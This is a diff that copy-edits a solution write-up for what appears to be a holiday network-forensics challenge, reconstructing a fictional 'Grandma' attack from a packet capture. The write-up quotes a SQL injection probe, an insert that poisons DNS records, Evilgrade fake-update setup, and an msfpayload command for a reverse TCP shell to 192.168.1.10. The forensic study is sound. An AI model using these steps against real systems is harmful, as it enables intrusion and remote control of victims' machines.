@@ -1,0 +1,253 @@
+Index: solution.txt
+===================================================================
+--- solution.txt	(revision 1225)
++++ solution.txt	(working copy)
+@@ -8,7 +8,7 @@
+   ------
+   QUESTION 1 - PART 1 - THE EMAIL BODY
+   ------
+-    The email itself. At Dec 25, 2011 06:51:12.965630000, a SMTP session was
++    The email itself. At Dec 25, 2011 06:51:12.965630000, an SMTP session was
+     opened to a mailserver - 192.168.1.3 - with the following message:
+       ----------------------------------------
+       Date: Sun, 25 Dec 2011 07:42:26 -0500 (EST)
+@@ -51,7 +51,7 @@
+   ------
+   QUESTION 1 - PART 2 - WORD DOCUMENT
+   ------
+-    The attachment on the email. This attachment is a word document, as
++    The attachment on the email is a Microsoft Word document, as
+     evidenced by the filename and content-type headers:
+       ----------------------------------------
+       Content-Type: APPLICATION/msword; name=LetterToMel.doc
+@@ -62,12 +62,12 @@
+       ----------------------------------------
+ 
+     To decode this, the way I like to do it is:
+-    1.  Open the xmas2011.pcap file in Wireshark
++    1.  Open the xmas2011.pcap file in Wireshark.
+     2.  Scroll down to packet #60 (sent Dec 25, 2011 06:51:13.272933000), which
+-        is the reconstructed SMTP data packet
++        is the reconstructed SMTP data packet.
+     3.  In Wireshark's treeview (the middle pane), right-click on 'Internet
+-        Message Format' and select 'Export selected packet bytes'
+-    4.  Type a filename, such as grandma-email.txt
++        Message Format' and select 'Export selected packet bytes'.
++    4.  Type a filename, such as grandma-email.txt.
+     5.  Open the filename in your favourite editor, and delete everything that
+         isn't base64-encoded. That is, everything before this line:
+           0M8R4KGxGuEAAAAAAAAAAAAAAAAAAAAAPgADAP7/CQAGAAAAAAAAAAAAAAAB
+@@ -78,10 +78,10 @@
+         $ base64 --ignore-garbage -d grandma-email.txt > grandma-email.doc
+ 
+     The document is now ready to be opened in the viewer of your choice (such
+-    as Libre Office). Be careful, though, grandma is a tricksy sort and there
+-    are countless file-format bugs diclosed in office applicationsevery month.
++    as LibreOffice). Be careful though! Grandma is a tricksy sort and there
++    are countless file-format bugs diclosed in office applications every month.
+ 
+-    The word document reads:
++    The document reads:
+       ----------------------------------------
+       Dear Mel,
+ 
+@@ -110,7 +110,7 @@
+   ------
+     Because this is an Ed Skoudis challenge, we immediately checked the
+     document's meta-data. Sure enough, there was a secret comment. This can be
+-    done using your favourite Office program by selecting file->properties.
++    done using your favourite office program by selecting File->Properties.
+     However, a proper hacker would naturally use exiftool:
+       ----------------------------------------
+       $ exiftool grandma-email.doc
+@@ -129,19 +129,19 @@
+   QUESTION 1 - PART 4 - MISCELLANEOUS
+   ------
+   Other information we can gather from mail headers:
+-  - Grandma has the IP address 192.168.1.10
+-  - Grandma has a mailserver at 192.168.1.3, called mail.gma
+-  - Grandma's email address is root@grandma.gma
+-  - Grandma is running Backtrack 5 and using Alpine 2.02 to send her email
++  - Grandma has the IP address 192.168.1.10.
++  - Grandma has a mailserver at 192.168.1.3, called mail.gma.
++  - Grandma's email address is root@grandma.gma.
++  - Grandma is running Backtrack 5 and using Alpine 2.02 to send her email.
+ 
+   ------
+   QUESTION 1 - PART 5 - SUMMARY
+   ------
+   Grandma's plan was to make Cousin Mel the beneficiary of her life insurance
+-  policy, fake her own death, frame Rudolph, and to fly to the Carribean with
++  policy, fake her own death, frame Rudolph, and to fly to the Caribbean with
+   Cousin Mel and a suitcase full of money.
+ 
+-  Because she's telling him to bring cash. it's reasonable to conclude that she
++  Because she's telling him to bring cash, it's reasonable to conclude that she
+   plans to murder Cousin Mel and take the money for herself. If you search
+   Grandma's hotel room, I'm certain you'll find a single one-way ticket to
+   the Carribean and a single phony passport.
+@@ -165,14 +165,14 @@
+     just doesn't believe in encryption?
+ 
+     In any case, Grandma looks up herself and Cousin Mel in Santa's application.
+-    They have both, it appears, been naughty. I'd rather not know what being a
++    It appears that they have both been naughty. I'd rather not know what being a
+     naughty grandma entails...
+ 
+     In the session starting at packet 125, sent at Dec 25, 2011
+     06:52:21.145359000, Grandma sends a single quote to the application:
+       name=%27
+ 
+-    This triggers a SQL error:
++    This triggers an SQL error with the following output from the webserver:
+       ----------------------------------------
+       <table border="3">
+       <tr><th>Name</th><th>Status</th></tr>
+@@ -207,11 +207,11 @@
+       naughtylist
+       ----------------------------------------
+     Lucky her! 'mysql' and 'information_schema' are built-in, 'naughtylist' is
+-    clearly the application that she's attacking, but 'mydns' is interesteding.
++    clearly the application that she's attacking, but 'mydns' is interesting.
+ 
+     I looked up MyDNS (http://mydns.bboy.net/), and it turns out that it's a
+-    MySQL-based DNS resolver. So, this gives Grandma access to modify DNS
+-    records on the Web server and, presumably, Santa's entire network.
++    MySQL-based DNS server. So, this gives Grandma access to modify DNS records
++    on the Web server and, presumably, Santa's entire network.
+ 
+     Next, she takes a closer look at the tables in the 'mydns' database:
+       ----------------------------------------
+@@ -251,8 +251,8 @@
+     santaslist.northpole as ns1.santaslist.northpole, which is presumably
+     itself.
+ 
+-    Grandma then adds her own authoritative server and checks to make sure
+-    it added properly:
++    Grandma then inserts her own authoritative server and checks to make sure
++    the insert worked as expected.
+       ----------------------------------------
+       mysql> insert into mydns.soa (origin,ns,mbox) values ("apple.com","ns1.sa
+       ntaslist.northpole","root.santaslist.northpole") #
+@@ -314,8 +314,8 @@
+     that Rudolph has just fired up iTunes. The reason I don't believe this is
+     iTunes' automatic update feature is because:
+     a) In the session starting at packet 291, bag.xml is requested. This
+-       happens when iTunes starts, not during an automatic update
+-    b) The attack, as we'll see later, requires some user intervention
++       happens when iTunes starts, not during an automatic update.
++    b) The attack, as we'll see later, requires some user intervention.
+ 
+     Based on the timing and the fact that this is manual, I believe that
+     Rudolph fell for social engineering. Grandma likely called him, probably
+@@ -325,8 +325,8 @@
+     I was originally working a theory where Grandma bought Rudolph an iPod
+     for Christmas, and when he installed iTunes to use it he was attacked, but
+     that doesn't appear to be what happened. When iTunes is newly installed,
+-    the version request has &new=1 on the end. Rudolph's didn't, so therefore
+-    iTunes was already installed.
++    the version request has the  &new=1 parameter included.. Rudolph's didn't,
++    therefore iTunes was already installed.
+ 
+     Meanwhile, Grandma was running Evilgrade on her PC. The smart gal that she
+     is, she would have patched Evilgrade to support newer versions of iTunes
+@@ -347,11 +347,11 @@
+                                         'dynamic' =>1,
+                                       }
+       ----------------------------------------
+-    Otherwise, there's a ~1/4 chance that the evilgrade server will tell iTunes
+-    it's at the latest version already - and no update will be downloaded.
+-    (PS: this drove me crazy!)
++    Otherwise, there's a 1/4 chance that the evilgrade server will tell iTunes
++    it's at the latest version already - and no update will be downloaded
++    (this drove me crazy!).
+ 
+-    There's an additional change that it looks like Grandma made, though I
++    There's an additional change that Grandma appears to have made, though I
+     don't understand it. Rather than using the default randomized filename,
+     Grandma hardcoded the filename to iTunesSetup.exe. This may be due to
+     different versions of Evilgrade being used, but I can't find anything in
+@@ -379,9 +379,9 @@
+     Once those changes were made, Granny had to generate a payload. The
+     evidence strongly suggests she used Metasploit:
+     a) The template for the payload was ApacheBench 2.2.14, which is the same
+-       template that Metasploit uses
++       template that Metasploit uses.
+     b) The payload itself was a stager that downloaded and ran a stage
+-       immediately after connecting (the code can be seen in 605)
++       immediately after connecting (the code can be seen in 605).
+     c) Generating a payload with the following command is almost identical:
+        ./msfpayload windows/shell/reverse_tcp LPORT=1225 LHOST=192.168.1.10 X
+     d) Running that payload in a controlled environment works with the following
+@@ -406,7 +406,7 @@
+     have configured evilgrade to point to that agent).
+ 
+     Then, finally, Grandma fired up Evilgrade. She may have disabled the DNS
+-    server, various modules, etc, but in the end she may have simply done it
++    server, various modules, etc., but in the end she may have simply done it
+     the easiest way possible:
+       ----------------------------------------
+       # ./evilgrade
+@@ -421,16 +421,16 @@
+ 
+     Then Rudolph would have had to do the following to generate the trace as we
+     see it:
+-    a) Started up iTunes
+-    b) Manually selected help->check for updated (or waited for the auto-update
+-       to kick in)
+-    c) Click on "Download iTunes"
++    a) Started up iTunes.
++    b) Manually selected Help->'Check for Updates' (or waited for the auto-update
++       to kick in).
++    c) Click on "Download iTunes".
+     d) When the browser pops up - IE8 - he would have had to click the yellow
+-       'Allow Download' button
+-    e) He'd have to hit 'Run' on the download, or double-click the .exe file
++       bar that appears at the top, to allow the download.
++    e) He'd have to hit 'Run' on the download, or double-click the .exe file.
+ 
+-    (If he lets Apple try and install the update itself, it will fail with a
+-    bad signature)
++    (If he lets the Apple Updater perform the update, it will fail with a
++    bad signature).
+ 
+     As soon as he runs the .exe file, it connects back to Grandma's computer on
+     TCP port 1225 with a Metasploit Reverse-TCP payload.
+@@ -485,13 +485,13 @@
+   QUESTION 2 - PART 5 - SUMMARY
+   ------
+   The summary of what we've learned here:
+-  a) Grandma used SQL Injection to compromise Santa's DNS server
+-  b) Grandma poisoned the DNS records for Apple's updater
+-  c) Grandma patched and ran evilgrade on her pc
++  a) Grandma used SQL Injection to compromise Santa's DNS server.
++  b) Grandma poisoned the DNS records for Apple's updater.
++  c) Grandma patched and ran evilgrade on her PC.
+   d) Rudolph (likely socially engineered by Grandma) ran iTunes and installed
+-     the evil update
++     the evil update.
+   e) Grandma used the reverse-shell to insert a fake location into Rudolph's
+-     phone database
++     phone database.
+ 
+ --------------------------------------------------------------------------------
+ QUESTION 3: Where should the authorities look for Grandma?
+@@ -515,11 +515,16 @@
+   Grandma, likewise, could be charged with multiple crimes:
+   - Obstruction of Justice
+   - Attempted insurance fraud
++  - Computer intrusion
+ 
+   Additionally, if I'm right that Grandma had been planning to kill Cousin Mel
+   (see QUESTION 1), this may be leverage to use against Cousin Mel to testify
+-  against Grandma (although I don't believe it's a crime in and of itself).
++  against Grandma
++  It might not be a crime in and of itself: conspiracy charges require two
++  or more persons to agree to commit a crime in the future.
++  Likewise, in nearly all locations where attempted murder is a recognized crime,
++  simply planning an unlawful killing is not criminal in and of itself. 
+ 
+   Odds are, though, Grandma won't be invited to the family dinners anymore...
+-  Perhaps putting her in a Home is the best punishment?
++  Perhaps putting her in a home is the best punishment?
+ 
